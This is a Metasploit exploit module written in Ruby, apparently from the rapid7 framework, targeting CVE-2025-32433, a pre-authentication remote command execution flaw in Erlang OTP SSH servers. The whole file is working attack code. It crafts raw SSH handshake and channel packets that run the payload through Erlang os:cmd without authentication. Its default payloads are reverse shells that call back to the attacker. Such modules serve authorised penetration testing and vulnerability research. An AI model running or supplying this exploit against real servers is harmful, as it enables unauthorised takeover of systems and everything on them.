##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::SSH

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Erlang OTP Pre-Auth RCE',
        'Description' => %q{
          This module exploits CVE-2025-32433, a pre-authentication vulnerability in Erlang-based SSH servers
          that allows remote command execution. By sending crafted SSH packets, it executes a Metasploit
          payload to establish a reverse shell on the target system.

          The exploit leverages a flaw in the SSH protocol handling to execute commands via the Erlang `os:cmd`
          function without requiring authentication.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Horizon3 Attack Team',
          'Matt Keeley', # PoC
          'Martin Kristiansen', # PoC
          'mekhalleh (RAMELLA Sebastien)' # module author powered by EXA Reunion (https://www.exa.re/)
        ],
        'References' => [
          ['CVE', '2025-32433'],
          ['URL', 'https://x.com/Horizon3Attack/status/1912945580902334793'],
          ['URL', 'https://platformsecurity.com/blog/CVE-2025-32433-poc'],
          ['URL', 'https://github.com/ProDefense/CVE-2025-32433']
        ],
        'Platform' => ['linux', 'unix'],
        'Arch' => [ARCH_CMD],
        'Targets' => [
          [
            'Linux Command', {
              'Platform' => 'linux',
              'Arch' => ARCH_CMD,
              'Type' => :linux_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/linux/https/x64/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Unix Command', {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ]
        ],
        'Privileged' => false,
        'DisclosureDate' => '2025-04-16',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => []
        }
      )
    )
  end

  # Builds SSH_MSG_CHANNEL_OPEN for session
  def build_channel_open(channel_id)
    # SSH_MSG_CHANNEL_OPEN (0x5a) + formatted string + channel ID + window size + max packet size
    "\x5a" +
      string_payload('session') +
      [channel_id].pack('N') +
      [0x68000].pack('N') +
      [0x10000].pack('N')
  end

  # Builds SSH_MSG_CHANNEL_REQUEST with 'exec' payload
  def build_channel_request(channel_id, command)
    # SSH_MSG_CHANNEL_REQUEST (0x62) + channel ID + 'exec' + want_reply + command
    "\x62" +
      [channel_id].pack('N') +
      string_payload('exec') +
      "\x01" +
      string_payload("os:cmd(\"#{command}\").")
  end

  # Builds a minimal but valid SSH_MSG_KEXINIT packet
  def build_kexinit
    cookie = "\x00" * 16

    "\x14" +
      cookie +
      name_list(
        [
          'curve25519-sha256',
          'ecdh-sha2-nistp256',
          'diffie-hellman-group-exchange-sha256',
          'diffie-hellman-group14-sha256'
        ]
      ) +
      name_list(['rsa-sha2-256', 'rsa-sha2-512']) +
      name_list(['aes128-ctr']) * 2 +
      name_list(['hmac-sha1']) * 2 +
      name_list(['none']) * 2 +
      name_list([]) * 2 +
      "\x00" +
      [0].pack('N')
  end

  # Formats a list of names into an SSH-compatible string (comma-separated)
  def name_list(names)
    string_payload(names.join(','))
  end

  # Pads a packet to match SSH framing
  def pad_packet(payload, block_size)
    min_padding = 4

    payload_length = payload.length
    padding_len = block_size - ((payload_length + 5) % block_size)
    padding_len += block_size if padding_len < min_padding

    [(payload_length + 1 + padding_len)].pack('N') +
      [padding_len].pack('C') +
      payload +
      "\x00" * padding_len
  end

  # Helper to format SSH string (4-byte length + bytes)
  def string_payload(str)
    s_bytes = str.encode('utf-8')
    [s_bytes.length].pack('N') + s_bytes
  end

  def exploit
    print_status('Starting exploit for CVE-2025-32433')

    begin
      ssh_opts = {
        host: datastore['RHOST'],
        port: datastore['RPORT'],
        timeout: 5
      }

      print_status('Connecting to SSH server...')
      tcp_socket = Rex::Socket::Tcp.create(
        'PeerHost' => ssh_opts[:host],
        'PeerPort' => ssh_opts[:port],
        'Timeout' => ssh_opts[:timeout]
      )

      print_status('Sending SSH banner...')
      tcp_socket.put("SSH-2.0-OpenSSH_8.9\r\n")

      banner = tcp_socket.get_once(1024)
      if banner
        print_good("Received banner: #{banner.strip}")
      else
        fail_with(Failure::Unknown, 'No banner received')
      end
      sleep(0.5)

      print_status('Sending SSH_MSG_KEXINIT...')
      kex_packet = build_kexinit
      tcp_socket.put(pad_packet(kex_packet, 8))
      sleep(0.5)

      print_status('Sending SSH_MSG_CHANNEL_OPEN...')
      chan_open = build_channel_open(0)
      tcp_socket.put(pad_packet(chan_open, 8))
      sleep(0.5)

      print_status('Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...')
      chan_req = build_channel_request(0, payload.encoded)
      tcp_socket.put(pad_packet(chan_req, 8))

      begin
        response = tcp_socket.get_once(1024, 5)
        if response
          vprint_status("Received response: #{response.unpack('H*').first}")
          print_good('Payload sent successfully')
        else
          print_status('No response within timeout period (which is expected)')
        end
      rescue Rex::TimeoutError
        print_status('No response within timeout period (which is expected)')
      end
      tcp_socket.close
    rescue Rex::ConnectionError
      fail_with(Failure::Unreachable, 'Failed to connect to the target')
    rescue Rex::TimeoutError
      fail_with(Failure::TimeoutExpired, 'Connection timed out')
    rescue StandardError => e
      fail_with(Failure::Unknown, "Error: #{e.message}")
    end
  end

end
